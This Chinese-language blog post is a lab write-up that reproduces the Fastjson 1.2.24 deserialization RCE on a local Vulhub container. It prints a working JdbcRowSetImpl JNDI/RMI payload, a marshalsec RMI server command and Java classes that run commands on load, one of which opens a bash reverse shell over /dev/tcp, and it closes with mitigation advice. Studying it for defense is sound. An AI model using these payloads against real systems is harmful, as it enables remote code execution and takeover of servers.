---
title: Fastjson 1.2.24 RCE 复现
createTime: 2026/03/12 00:00:00
permalink: /posts/fastjson-1-2-24-rce/
description: 记录 Vulhub Fastjson 1.2.24 反序列化远程命令执行漏洞的复现过程，包括 JdbcRowSetImpl JNDI/RMI 利用链、命令执行验证和反弹 shell。
cover: /assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-01.png
excerpt: 本文复现 Fastjson 1.2.24 反序列化 RCE，通过 JdbcRowSetImpl 触发 JNDI/RMI 查询，让目标 JVM 从 HTTP codebase 下载远程 class，最终完成命令执行与反弹 shell 验证。
categories:
  - Web 安全
  - 靶场复盘
tags:
  - Fastjson
  - RCE
  - Java
  - 反序列化
  - Vulhub
---

# Fastjson 1.2.24 RCE 复现

> 环境：本地 Vulhub Docker 靶场，目标服务端口 `8090`，Java 环境为 `java-8-openjdk`。

## 环境

- 靶场：Vulhub `fastjson/1.2.24-rce`
- 容器 Java：`java-8-openjdk`
- Web 端口：`8090`
- 攻击机：宿主机
- 宿主机 Docker 网关 IP：`172.18.0.1`

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-01.png)

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-02.png)

## 漏洞概述

本次复现的是 **Fastjson 1.2.24 反序列化远程命令执行漏洞**，常见编号为 **CVE-2017-18349**。

Fastjson 是阿里开源的 Java JSON 解析库，正常功能是把 JSON 字符串转换成 Java 对象。问题出在旧版本 Fastjson 支持 `@type` 字段，也就是 **AutoType 自动类型识别**。当服务端直接解析用户可控 JSON 时，攻击者可以通过 `@type` 指定一个危险 Java 类，让 Fastjson 在反序列化过程中实例化该类，并调用它的 setter 方法。某些类的 setter/getter 内部会触发网络请求、JNDI 查询、类加载等危险行为，从而形成 RCE 利用链。

本实验使用的利用链是：

```text
Fastjson 解析 JSON
  -> 读取 @type
  -> 实例化 com.sun.rowset.JdbcRowSetImpl
  -> 设置 dataSourceName 为 rmi://172.18.0.1:8653/test
  -> 设置 autoCommit=true
  -> JdbcRowSetImpl 触发 JNDI/RMI 查询
  -> 访问攻击机 RMI 服务
  -> RMI 服务返回远程 class 的 HTTP 地址
  -> 目标 JVM 下载并加载 test.class
  -> 执行 static 代码块中的命令
```

## 漏洞产生原因

核心原因不是 `touch`、`bash` 或 RMI 本身，而是 **Fastjson 在反序列化不可信 JSON 时允许用户控制对象类型**。

关键点有三个：

1. **`@type` 可控**
   Fastjson 旧版本允许 JSON 中使用 `@type` 指定要反序列化成哪个 Java 类。
2. **危险类可被实例化**
   这里指定的是 JDK 自带类：
   ```text
   com.sun.rowset.JdbcRowSetImpl
   ```
   这个类本身用于 JDBC RowSet，但它的某些属性会触发 JNDI 数据源查找。
3. **属性赋值会触发危险行为**
   Payload 中的：
   ```json
   "dataSourceName": "rmi://172.18.0.1:8653/test",
   "autoCommit": true
   ```
   会让 `JdbcRowSetImpl` 在设置自动提交时尝试连接数据源，于是触发 JNDI lookup，请求我们控制的 RMI 服务。

所以这条链的本质是：

```text
反序列化类型可控 + 危险类 setter 触发 JNDI + 远程类加载 = 命令执行
```

## 为什么要这样复现

### 1. 为什么要写 `test.java`

`test.java` 是最终要在目标容器里执行的类。它的 `static` 代码块会在类被 JVM 加载时自动执行，不需要显式调用方法。

```java
static {
    Runtime.getRuntime().exec(...);
}
```

也就是说，只要目标 JVM 成功加载 `test.class`，命令就会执行。

### 2. 为什么要编译成 `test.class`

JVM 不能直接执行 `.java` 源码，远程类加载阶段需要的是 Java 字节码文件，所以要先用 `javac` 编译：

```text
test.java -> test.class
```

### 3. 为什么要启动 Python HTTP 服务

RMI 服务本身不直接把完整 class 文件发给目标，它返回的是一个远程 codebase 地址。目标 JVM 会根据这个地址再去下载 class 文件。

所以 Python HTTP 服务的作用是：

```text
给目标 JVM 提供 test.class 下载地址
```

对应本次命令：

```powershell
python -m http.server 5623
```

最终目标会请求：

```text
http://172.18.0.1:5623/test.class
```

### 4. 为什么要启动 RMI 服务

Payload 里的 `dataSourceName` 指向的是：

```text
rmi://172.18.0.1:8653/test
```

目标容器解析 payload 后，会访问这个 RMI 地址。RMI 服务收到请求后，会告诉目标 JVM：你要加载的类在这个 HTTP 地址：

```text
http://172.18.0.1:5623/#test
```

所以 RMI 服务起到“中转/指路”的作用：

```text
目标服务 -> RMI 服务 -> 返回 HTTP codebase -> 目标服务下载 class
```

### 5. 为什么要查 Docker 网关 IP

靶场服务跑在 Docker 容器里，容器内的 `127.0.0.1` 指的是容器自己，不是宿主机。我们的 RMI 服务和 HTTP 服务开在宿主机上，所以 payload 里必须写 **容器能访问到的宿主机地址**。

本次通过 `docker inspect` 查到网关地址：

```text
172.18.0.1
```

因此 payload、RMI codebase、反弹 shell 地址都使用这个 IP。

## Payload 字段解释

```json
{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://172.18.0.1:8653/test",
    "autoCommit": true
  }
}
```

| 字段 | 作用 |
| --- | --- |
| `b` | 普通 JSON key，名字不重要，只是包一层对象 |
| `@type` | 告诉 Fastjson 把该对象反序列化成 `JdbcRowSetImpl` |
| `dataSourceName` | 设置 JNDI 数据源地址，这里指向攻击机 RMI 服务 |
| `autoCommit` | 触发 `JdbcRowSetImpl` 尝试连接数据源，从而触发 JNDI lookup |

## 利用成功的判断依据

本次复现中有三个证据可以证明链路打通：

1. RMI 服务收到目标请求；
2. Python HTTP 服务出现 `test.class` 或 `reverse.class` 下载请求；
3. 目标容器里出现 `/tmp/test.txt`，或者 `nc` 成功收到反弹 shell。

其中 `/tmp/test.txt` 是更稳定的验证方式，因为它只证明命令执行，不依赖交互式 shell 是否连通。

## 本次复现结论

本环境中 Fastjson 1.2.24 能够被构造的 `@type` payload 触发 `JdbcRowSetImpl` JNDI 查询，目标容器会访问攻击机 RMI 服务，并通过 HTTP 下载远程 class。由于远程 class 的静态代码块中包含系统命令，最终在目标容器内完成命令执行。

## 开始复现

先写一个 `test.java` 备用：

```java
import java.lang.Runtime;
import java.lang.Process;

public class test {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/test.txt"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

这段代码的作用是在 `/tmp` 目录创建一个 `test.txt`。

然后使用 **Java 8** 环境的 `javac` 编译 `test.java`：

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-03.png)

得到 `test.class` 后，通过 Python 把当前目录变成一个简单的 HTTP 文件服务器：

```powershell
python -m http.server 5623
```

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-04.png)

接着需要启动一个 **RMI** 服务器。这里不是目标真的去“调用 test 方法”，而是目标在触发 JNDI/RMI 查询后，请求我们控制的 RMI 服务；RMI 服务再返回一个指向 HTTP codebase 的引用，目标 JVM 根据这个引用去访问 Python HTTP 服务并下载 `test.class`。

构建 RMI 服务器需要 `marshalsec`，常见文件名为 `marshalsec-0.0.3-SNAPSHOT-all.jar`；如果本地文件名不同，命令里以实际 jar 文件名为准。

- <https://github.com/RandomRobbieBF/marshalsec-jar>

这里需要获取宿主机 Docker 网关 IP，可通过命令查看：

```powershell
docker inspect <container_id>
```

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-05.png)

启动 RMI 服务：

```powershell
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://172.18.0.1:5623/#test" 8653
```

上面命令中，`#` 后面加的是 `test.class` 的类名 `test`；末尾端口号是 `8653`。后面使用 Fastjson 漏洞触发远程请求时，就会请求我们监听的 RMI 服务。

## 构造并发送 Payload

先用 Burp 抓个包，把 `GET` 请求改成 `POST`，`Content-Type` 改为 `application/json`，再加上 POST 请求体：

```json
{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://172.18.0.1:8653/test",
    "autoCommit": true
  }
}
```

示例请求：

```http
POST http://127.0.0.1:8090/ HTTP/1.1
Host: 127.0.0.1:8090
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 160

{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://172.18.0.1:8653/test",
    "autoCommit": true
  }
}
```

在 HTTP 服务和 RMI 服务都开着的情况下，发送 payload 后可以看到：

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-06.png)

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-07.png)

进入 Docker 里的环境查看：

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-08.png)

可以看到确实写入了 `test.txt`，说明命令执行链路可行。

## 反弹 shell 验证

下面把要执行的命令改成反弹 shell。新建 `reverse.java`：

```java
import java.lang.Runtime;
import java.lang.Process;

public class reverse {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/172.18.0.1/4563 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

步骤同上：编译 `reverse.java`，开启 HTTP 服务、RMI 服务，并让 RMI codebase 指向 `#reverse`。

这次要拿 shell，先设置监听：

```powershell
nc -lvp 4563
```

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-09.png)

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-10.png)

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-11.png)

因为这里的类名和文件名已经从 `test` 变成了 `reverse`，payload 里的 RMI 路径也要同步修改：

```json
{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://172.18.0.1:8653/reverse",
    "autoCommit": true
  }
}
```

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-12.png)

修改后发包，可以看到监听端口成功拿到 shell：

![](/assets/img/fastjson-1-2-24-rce/fastjson-1-2-24-rce-13.png)

## 复现中容易踩的坑

1. **JDK 版本影响很大**

   该复现依赖 JNDI 远程 codebase 加载。较新的 JDK 默认限制 RMI/LDAP 远程类加载，可能出现 RMI 和 HTTP 都能访问，但 class 不执行的情况。Vulhub 这个环境使用较旧 Java 8 环境，所以更容易复现成功。

2. **IP 不能写 127.0.0.1**

   目标服务在 Docker 容器中运行，容器里的 `127.0.0.1` 指向容器自身，不是宿主机。攻击机服务开在宿主机上时，需要使用 Docker 网关 IP，比如本次的 `172.18.0.1`。

3. **类名、文件名、payload 要对应**

   如果 Java 类名是 `test`，那么编译后是 `test.class`，RMI codebase 里应写 `#test`，payload 里也要请求 `/test`。如果换成 `reverse`，则对应 `reverse.class`、`#reverse`、`rmi://.../reverse`。

4. **HTTP 服务和 RMI 服务都要保持开启**

   RMI 服务负责返回远程类引用，HTTP 服务负责真正提供 `.class` 文件。少一个都无法完成完整利用链。

5. **HTTP 500 不代表失败**

   Fastjson/JNDI 触发过程中可能抛异常，页面返回 500，但命令可能已经执行。因此要结合 RMI 日志、HTTP 下载日志、目标容器内文件或 shell 连接综合判断。

## 修复建议

1. **升级 Fastjson**

   不要继续使用 1.2.24 这类旧版本。生产环境建议升级到安全版本，或迁移到 fastjson2。

2. **关闭 AutoType / 开启 SafeMode**

   如果业务不需要 `@type`，应禁用 AutoType。新版本可开启 SafeMode：

   ```java
   ParserConfig.getGlobalInstance().setSafeMode(true);
   ```

   或通过 JVM 参数：

   ```bash
   -Dfastjson.parser.safeMode=true
   ```

3. **白名单反序列化类型**

   如果业务确实需要 AutoType，只允许明确可信的业务类，不能让外部输入任意指定类名。

4. **限制服务器出站访问**

   生产环境中应限制应用服务器访问未知 RMI、LDAP、HTTP 外连地址。即使存在反序列化入口，也能降低 JNDI 外带和远程类加载成功率。

5. **升级 JDK**

   较新的 JDK 默认收紧 JNDI 远程 codebase 加载策略，可以作为防御加固手段之一。但根因仍然是 Fastjson 反序列化不可信输入，不能只依赖 JDK 版本。
